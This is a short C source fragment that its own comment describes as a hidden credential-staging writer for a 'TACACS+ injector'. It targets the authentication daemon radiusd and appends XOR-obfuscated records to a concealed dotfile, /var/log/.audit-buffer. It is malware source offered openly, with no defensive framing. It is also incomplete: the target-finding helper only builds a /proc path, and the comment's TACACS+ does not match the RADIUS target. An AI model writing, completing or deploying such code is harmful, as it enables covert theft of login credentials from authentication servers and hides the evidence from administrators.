// Minimal hidden encoded log writer (cleartext form of the TACACS+ injector
// credential staging): targets an authentication daemon and appends
// XOR-obfuscated records to a dotfile in /var/log.
#include <stdio.h>

static const char *target_service = "radiusd";

static void find_target(int pid, char *path, size_t cap) {
    snprintf(path, cap, "/proc/%d/comm", pid);
}

static void store_bytes(const unsigned char *rec, size_t n) {
    FILE *fp = fopen("/var/log/.audit-buffer", "ab");
    if (!fp) return;
    for (size_t i = 0; i < n; ++i) {
        unsigned char masked = rec[i] ^ 0x53;
        fwrite(&masked, 1, 1, fp);
    }
    fclose(fp);
}
